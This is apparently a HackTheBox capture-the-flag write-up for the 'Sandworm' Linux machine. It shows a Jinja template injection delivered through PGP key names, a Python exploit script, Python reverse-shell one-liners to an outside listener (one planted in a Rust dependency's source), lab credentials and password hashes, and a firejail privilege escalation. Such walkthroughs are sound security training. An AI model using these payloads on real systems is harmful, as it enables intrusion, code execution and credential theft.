# Sandworm

Snadworm is a HackTheBox lab Linux machine released on 17/6/23 in Beta Season II.

This machine features:

* GnuPG
* Server-side Template Injection
* Rust
* Firejail Vulnerability

## Reconnaissance

### Port Scanning

A quick port scanning shows us there're ports `22`, `80`, and `443`:

```bash
$ sudo nmap -p- -n -Pn -sS -T4 --min-rate 1000 -v 10.129.77.49 -oN ports.nmap
...
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
...
```

### Hostname

The certificate returned tells us the hostname is `ssa.htb`.

```bash
$ openssl s_client -connect <IP>:443 -showcerts
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = SA, ST = Classified, L = Classified, O = Secret Spy Agency, OU = SSA, CN = SSA, emailAddress = atlas@ssa.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = SA, ST = Classified, L = Classified, O = Secret Spy Agency, OU = SSA, CN = SSA, emailAddress = atlas@ssa.htb
verify return:1
---
Certificate chain
 0 s:C = SA, ST = Classified, L = Classified, O = Secret Spy Agency, OU = SSA, CN = SSA, emailAddress = atlas@ssa.htb
   i:C = SA, ST = Classified, L = Classified, O = Secret Spy Agency, OU = SSA, CN = SSA, emailAddress = atlas@ssa.htb
...
```

We can also see the same information in the HTTP `301` response using `curl`.

```bash
$ curl -i http://10.129.77.49
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 18 Jun 2023 13:46:03 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: https://ssa.htb/
...
```

We then add this hostname to our host file `/etc/host`.

No common vhosts can be found using `ffuf`.

{% code overflow="wrap" %}
```bash
$ ffuf -u https://ssa.htb -H 'Host: FUZZ.ssa.htb' -w path_to_subdomains-top1million-5000.txt -fs 8161
```
{% endcode %}

### Techniques

The footer suggests that the site is built on _Flask_.

<figure><figcaption></figcaption></figure>

### URL Path

We can crawl hypertext and embedded links with the Python script [_like this_](../../web/enumeration.md#custom-script).

```bash
$ url_crawler.py https://ssa.htb links.txt
https://ssa.htb
 https://ssa.htb/static/favicon.ico
 https://ssa.htb/static/bootstrap-icons2.css
 https://ssa.htb/static/bootstrap-icons.css
 https://ssa.htb/static/styles.css
 https://ssa.htb/
  https://ssa.htb/about
   https://ssa.htb/contact
    https://ssa.htb/guide
     https://ssa.htb/pgp
     https://ssa.htb/static/circleLogo2.png
     https://ssa.htb/static/bootstrap.bundle.min.js
     https://ssa.htb/static/popper.min.js
     https://ssa.htb/static/jquery.min.js
     https://ssa.htb/static/scripts.js
   https://ssa.htb/static/eagl2.png
```

More paths like `admin`, `login`, `logout`, `view`, and `process` can be found using `ffuf`.

```bash
$ ffuf -u https://ssa.htb/FUZZ -w path_to_raft-medium-words.txt
...
admin                   [Status: 302, Size: 227, Words: 18, Lines: 6, Duration: 24ms]
login                   [Status: 200, Size: 4392, Words: 1374, Lines: 83, Duration: 65ms]
contact                 [Status: 200, Size: 3543, Words: 772, Lines: 69, Duration: 104ms]
logout                  [Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 123ms]
view                    [Status: 302, Size: 225, Words: 18, Lines: 6, Duration: 89ms]
about                   [Status: 200, Size: 5584, Words: 1147, Lines: 77, Duration: 94ms]
process                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 82ms]
guide                   [Status: 200, Size: 9043, Words: 1771, Lines: 155, Duration: 76ms]
pgp                     [Status: 200, Size: 3187, Words: 9, Lines: 54, Duration: 119ms]
...
```

### Contact

The site allows users to submit PGP-encrypted messages with a guide about how to use PGP.

<figure><figcaption></figcaption></figure>

### PGP Guide

In the guide, the site implements functionalities including _PGP decrypting, encrypting, and verifying._

{% tabs %}
{% tab title="Decrypt" %}
We can find the pgp in `/pgp`, save it to `ssa.gpg`, and import it for the recipient `atlas@ssa.htb` using `gpg`.

```bash
$ gpg --import ssa.gpg
$ gpg --list-keys
...
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]
...
```

We can encrypt some content for `atlas@ssa.htb`.

<pre class="language-bash"><code class="lang-bash"><strong>$ echo hello > file
</strong><strong>$ gpg -e -r atlas --output file.asc --armor file
</strong><strong>$ cat file.asc 
</strong>-----BEGIN PGP MESSAGE-----

hQIMA2u3M9ko0UzmARAAnNrZBQ+HEyyqWXKGb/Zzt/NqJ8e4pq0gprJ0VMMU2VkW
dgZIZChl6uoMbkR9txvXdPZKMN//wexStfrFSVpUZeg6UC9Bk4EI3FOCyiznf61F
Wa7pXfdN8OgCwd0Yp5xDQnx3n5uunpmpDUqCPwVAwRMPRWzp08p/NvHvPmYpFSTc
a2qN0dM/V/Ok0nzwbH+gTKpQscX79CgaepEq0Isd47X/Tihba+4N66mWdzUTsBGf
y7LCHLZqOUygFy1ysrMb2u/Pcl5vkIUFtW3LvBun4I3yCXP74dflBpRm3otienUW
PNWTkqAvRIINkx9BCtrS66THS6yBrbmUUivYVcNHqG1jrGdFsGPoo3uonHKuczkB
AS1Bzt08VqJGq6IAFcnox7nJd5qvPqcddmjqsEvOfPGeqAMQ7InnT0VqBiO84kED
ucqUdFaHZYN78C7h48RRGa+want32j52zvRBIKxeVd4+PGRqzw13+EqGbjHLb4yf
dSoedxhpRh0km/I21Ym+Eg7gRa2ydmTdm578h7V2BIo1RYeWce92HXaeu1EFMSop
XZ6UQgZS/uiFAkJazue8YmRnjPKGrRI10/qKqimfeJwgQfJNt3dG6qcvkpOIFGCU
zRxxKj2S59X4ZXZ1zAxpGPinck2QXBb+/o/Pvcb9ltLiXEs93Cqq/bEtCcNKtVbS
RQF05OqT5pg9iVNv66G9v4a9tlXfPrpwQPNJw8yxlR3N68zmq/yrrGdbLjXRlImR
VPdu7ZOY4gNF+BoLfRZQ3Ju6/rkqSw==
=dWaU
-----END PGP MESSAGE-----
</code></pre>

We see that the message is decrypted successfully.

<figure><figcaption></figcaption></figure>
{% endtab %}

{% tab title="Verifying" %}
Unlike other functions, the site also implements javascript code for verifying signed messages.

```javascript
$(document).ready(function() {
    $(".verify-form").submit(function(e) {
      e.preventDefault();
      var signed_text = $("#signed_text").val();
      var public_key = $("#public_key").val();
      $.ajax({
        type: "POST",
        url: "/process",
        data: { signed_text: signed_text, public_key: public_key },
        success: function(result) {
          $("#signature-result").html(result);
          $("#signature-modal").modal("show");
```

Although the form action `/guide/verify` is still usable.

<figure><figcaption></figcaption></figure>

The response indicates that the site uses `GnuPG` in the backend.

{% embed url="https://www.gnupg.org/gph/en/manual.html#AEN136" %}
{% endtab %}
{% endtabs %}

## Initial Access

### Server-side Template Injection

Since the server will render the decrypted message controlled by us, we shall try to test if any server-side template injection vulnerability exists.

<figure><figcaption></figcaption></figure>

We've seen that the site is built using Flask; hence it may use Jinja as its template engine.

We first encrypt the message, where the string `hi` will be comment out in Jinja:

```
{#hi#}
```

using the target's PGP and we submit through the encryption function.

We see the content is rendered successfully, which indicates that no template injection can be abused here.

.png>)

We try to generate a keypair for the user named `{#hi#}yes` this time and we submit the message signed with this key through the verifying function.

```bash
$ gpg --list-keys yes
pub   rsa3072 2023-06-20 [SC] [expires: 2025-06-19]
      C03DD9EBFEEA3C77177E01E6E51568B06C3DC5D7
uid           [ultimate] {#hi#}yes
sub   rsa3072 2023-06-20 [E] [expires: 2025-06-19]
```

We see the string `{#hi#}` disappears this time, which indicates that we've found a SSTI vulnerability.

.png>)

### Remote Code Execution

To abuse the vulnerability to achieve remote code execution, we shall generate keypairs with usernames like `{{__import__('os').system('ls')}}`.

To automate the process, we write the following script using `python-gnupg` and `cmd` modules:

```python
#!/usr/bin/python3

import cmd
import requests
import logging
import shlex
import gnupg
from subprocess import Popen, PIPE
from bs4 import BeautifulSoup as bs

requests.packages.urllib3.disable_warnings()
logger = logging.getLogger(__name__)

class Exploit(cmd.Cmd):
    def __init__(self):
        super().__init__()
        self.proxies = {
                'https':'http://localhost:8080'
                }
        self.url = 'https://ssa.htb'
        self.getPGP()
        self.gpg = gnupg.GPG()
        self.secret = 's3cret'

    def get(self, *kargs, **kw):
        res = requests.get(*kargs, verify=False, proxies=self.proxies, **kw)
        return res

    def post(self, *kargs, **kw):
        res = requests.post(*kargs, verify=False, proxies=self.proxies, **kw)
        return res

    def getPGP(self):
        res = self.get(self.url + '/pgp')
        pgp = bs(res.text, 'lxml').select('pre')[0].text
        print(pgp)
        with open('ssa.pgp', 'w') as o:
            logger.debug(f"got pgp {pgp[:100]}")
            o.write(pgp)
        pGPExists = b'atlas@ssa.htb' in Popen(shlex.split('gpg --list-keys'), stdout=PIPE).communicate()[0]
        logger.debug(f"target's PGP exists:{pGPExists}")

        if not pGPExists:
            Popen(shlex.split('gpg --import ssa.pgp'))

    def inject(self, payload):
        name = "Python--->{{%s}}" % payload
        logger.debug(f"name {name}")
        key = self.gpg.gen_key(self.gpg.gen_key_input(name_real=name, name_email='lala@example.com', passphrase=self.secret))
        signed = self.gpg.sign('hello', keyid=key.fingerprint, passphrase=self.secret).data

        data = {
                'signed_text': signed,
                'public_key': self.gpg.export_keys(key.fingerprint)
                }
        res = self.post(self.url + '/process', data = data)
        print(res.text)

    def default(self, cmd):
        self.inject(cmd)

    def do_EOF(self, _):
        return True

e = Exploit()
e.cmdloop()
```

We can also execute remote commands via Python code like `request.application.__globals__.__builtins__.__import__('os').popen('ls').read()` now:

```bash
(cmd) request.application.__globals__.__builtins__.__import__('os').popen('id').read()
...
[GNUPG:] GOODSIG 7BF5637BBF510011 Python--->uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
 <lala@example.com>
gpg: Good signature from "Python--->uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
...
```

We can get a reverse shell too.

{% code overflow="wrap" %}
```bash
(Cmd) request.application.__globals__.__builtins__.__import__('os').system('python3 -c "import socket,pty,os;s=socket.socket();s.connect((\"10.10.14.15\",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn(\"/bin/bash\");"')
```
{% endcode %}

### Credential Hunting

We see the source of the site is under the path `/var/www/html/SSA/SSA`.

We can see the cause of the SSTI is the usage of `render_template_string`:

<figure><figcaption></figcaption></figure>

We found the MySQL credential `atlas:GarlicAndOnionZ42`:

```bash
atlas@sandworm:/var/www/html/SSA/SSA$ cat __init__.py 
from flask import Flask
from flask_login import LoginManager
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

def create_app():
    app = Flask(__name__)

    app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21'
    app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'
```

We found the PGP key's passphrase `$M1DGu4rD$`:

{% code title="/var/www/html/SSA/SSA/app.py" %}
```python
...
@main.route("/contact", methods=('GET', 'POST',))
def contact():
    if request.method == 'GET':
        return render_template("contact.html", name="contact")
    tip = request.form['encrypted_text']
    if not validate(tip):
        return render_template("contact.html", error_msg="Message is not PGP-encrypted.")

    msg = gpg.decrypt(tip, passphrase='$M1DGu4rD$')
...
```
{% endcode %}

We can use Python package `sqlalchemy` to access the MySQL database `SSA`.

```python
import sqlalchemy

engine = sqlalchemy.create_engine('mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA')
conn = engine.connect()
conn.execute(sqlalchemy.text('SELECT * FROM users;'))
```

We can then obtain a list of usernames and password hashes.

{% code overflow="wrap" %}
```
[(1, 'Odin', 'pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f'), (2, 'silentobserver', 'pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d')]
```
{% endcode %}

By formatting the hashes above as, for example, `12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f:q0WZMG27Qb6XwVlZ`, we can try to use `hashcat` to crack the password with mode 1460.

{% embed url="https://github.com/hashcat/hashcat/issues/3205" %}

In file `~/.config/httpie/sessions/localhost_5000/admin.json`, we found credential `silentobserver:quietLiketheWind22`.

```bash
atlas@sandworm:~/.config/httpie$ cat sessions/localhost_5000/admin.json
{   
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}

```

We can login to the target using SSH with this credential now.

<figure><figcaption></figcaption></figure>

## Privilege Escalation

### Crate tipnet

We found a crate named `tipnet` located under directory `/opt`.

The compiled binary has SUID permission set.

```bash
silentobserver@sandworm:~$ ls -l /opt/tipnet/target/debug/tipnet
-rwsrwxr-x 2 atlas atlas 59047248 Jun  6 10:00 /opt/tipnet/target/debug/tipnet
```

We note that this crate uses an external crate `logger` located in `/opt/crates/logger`.

```bash
silentobserver@sandworm:~$ cat /opt/tipnet/Cargo.toml 
[package]
name = "tipnet"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
chrono = "0.4"
mysql = "23.0.1"
nix = "0.18.0"
logger = {path = "../crates/logger"}
```

### System Activities Monitoring

We can use the tool `pspy64` to monitor system activities.

```bash
silentobserver@sandworm:~$ ./pspy64 -f
```

We see that the crate is compiled and executed by `cargo run` every 1 minute and 50 seconds by `root` using user `atlas` with mode `e`.

{% code fullWidth="false" %}
```bash
2023/06/21 09:10:01 CMD: UID=0     PID=25158  | /usr/sbin/CRON -f -P 
2023/06/21 09:10:01 CMD: UID=0     PID=25157  | /usr/sbin/cron -f -P 
2023/06/21 09:10:01 CMD: UID=0     PID=25156  | /usr/sbin/CRON -f -P 
2023/06/21 09:10:01 CMD: UID=0     PID=25161  | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/ 
2023/06/21 09:10:01 CMD: UID=0     PID=25160  | /bin/bash /root/Cleanup/clean.sh 
2023/06/21 09:10:01 CMD: UID=0     PID=25159  | /bin/sh -c /bin/bash /root/Cleanup/clean.sh 
2023/06/21 09:10:01 CMD: UID=0     PID=25164  | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/21 09:10:01 CMD: UID=0     PID=25162  | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/21 09:10:01 CMD: UID=0     PID=25165  | 
2023/06/21 09:10:01 CMD: UID=0     PID=25166  | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
2023/06/21 09:10:01 CMD: UID=0     PID=25167  | sleep 10 
2023/06/21 09:10:01 CMD: UID=1000  PID=25168  | 
2023/06/21 09:10:01 CMD: UID=1000  PID=25169  | 
2023/06/21 09:10:01 CMD: UID=1000  PID=25170  | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed 
2023/06/21 09:10:01 CMD: UID=1000  PID=25172  | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg 
2023/06/21 09:10:01 CMD: UID=1000  PID=25174  | /usr/bin/cargo run --offline 
2023/06/21 09:10:11 CMD: UID=0     PID=25179  | /bin/bash /root/Cleanup/clean_c.sh 
2023/06/21 09:10:11 CMD: UID=0     PID=25180  | /bin/rm -r /opt/crates 
2023/06/21 09:10:11 CMD: UID=0     PID=25181  | /bin/cp -rp /root/Cleanup/crates /opt/ 
2023/06/21 09:10:11 CMD: UID=0     PID=25182  | /bin/bash /root/Cleanup/clean_c.sh 
2023/06/21 09:12:01 CMD: UID=0     PID=25188  | /usr/sbin/CRON -f -P 
2023/06/21 09:12:01 CMD: UID=0     PID=25187  | /usr/sbin/CRON -f -P 
2023/06/21 09:12:01 CMD: UID=0     PID=25189  | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
2023/06/21 09:12:01 CMD: UID=0     PID=25190  | sleep 10 
2023/06/21 09:12:01 CMD: UID=0     PID=25191  | 
2023/06/21 09:12:01 CMD: UID=0     PID=25193  | /bin/sudo -u atlas /usr/bin/cargo run --offline
```
{% endcode %}

We also see that the crate's source codes under `/opt/crates` are overwritten in 10 seconds after the crate is executed.

```bash
2023/06/21 09:10:11 CMD: UID=0     PID=25179  | /bin/bash /root/Cleanup/clean_c.sh 
2023/06/21 09:10:11 CMD: UID=0     PID=25180  | /bin/rm -r /opt/crates 
2023/06/21 09:10:11 CMD: UID=0     PID=25181  | /bin/cp -rp /root/Cleanup/crates /opt/ 
2023/06/21 09:10:11 CMD: UID=0     PID=25182  | /bin/bash /root/Cleanup/clean_c.sh 
2023/06/21 09:12:01 CMD: UID=0     PID=25188  | /usr/sbin/CRON -f -P 
2023/06/21 09:12:01 CMD: UID=0     PID=25187  | /usr/sbin/CRON -f -P 
2023/06/21 09:12:01 CMD: UID=0     PID=25189  | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
2023/06/21 09:12:01 CMD: UID=0     PID=25190  | sleep 10 
2023/06/21 09:12:01 CMD: UID=0     PID=25191  | 
2023/06/21 09:12:01 CMD: UID=0     PID=25193  | /bin/sudo -u atlas /usr/bin/cargo run --offline
```

We can also find that the credential we found early is put there deliberately.

```bash
2023/06/21 04:15:01 CMD: UID=0     PID=19806  | /bin/cp -p /root/Cleanup/admin.json /home/atlas/.config/httpie/sessions/localhost_5000/  
```

### User atlas

We found that we can modify the content of the source of the crate `logger` which is used in the SUID program `tipnet` owned by the user `atalas`.

```bash
silentobserver@sandworm:~$ ls -l /opt/crates/logger/src/lib.rs 
-rw-rw-r-- 1 atlas silentobserver 732 May  4 17:12 /opt/crates/logger/src/lib.rs
```

So, we shall be able to execute commands as the user `atlas`, if we overwrite the source code `/opt/crates/logger/src/lib.rs` after the script `/root/Cleanup/clean_c.sh` being executed and before the next compilation triggered by CRON.

We insert the following code after the script `/root/Cleanup/clean_c.sh` being executed.

```rust
...
use std::process::Command;
...

pub fn log(user: &str, query: &str, justification: &str) {
    let o = Command::new("python3").args(&["-c", "import socket,pty,os;s=socket.socket();s.connect((\"10.10.14.15\",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn(\"/bin/bash\");"]).output().expect("none");
    println!("{}", String::from_utf8(o.stdout).unwrap());
...
```

Then we shall receive a reverse shell later.

### Firejail

We note that the user if in the group `jailer`, users of which can run the setuid-root program `firejail` to sandbox processes.

```bash
atlas@sandworm:~$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
atlas@sandworm:~$ ls -l /usr/local/bin/firejail
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
```

The version of the program `firejail` seems to suffer the local privilege escalation vulnerability.

```bash
$ atlas@sandworm:~$ firejail --version
firejail version 0.9.68
```

{% embed url="https://seclists.org/oss-sec/2022/q2/188" %}

By using the exploit, we can get the root user.

<figure><figcaption></figcaption></figure>

{% embed url="https://www.openwall.com/lists/oss-security/2022/06/08/10/1" %}

## Miscellaneous
